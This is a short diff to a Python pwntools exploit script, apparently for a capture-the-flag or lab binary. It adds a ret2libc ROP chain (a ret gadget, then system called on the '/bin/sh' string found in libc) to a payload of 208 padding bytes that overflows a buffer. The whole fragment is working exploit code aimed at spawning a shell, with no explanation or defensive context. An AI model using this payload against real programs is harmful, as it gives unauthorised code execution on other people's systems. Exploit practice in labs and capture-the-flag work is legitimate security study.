@@ -50,6 +50,10 @@ rop.raw(syscall_gadget)
 rop.raw(bytes(frame))
 
 
+rop = pwn.ROP(libc)
+rop.call(rop.ret)
+rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
+
 payload = b'A' * 208 + rop.chain()
 
 print(f'payload length: {len(payload)}')
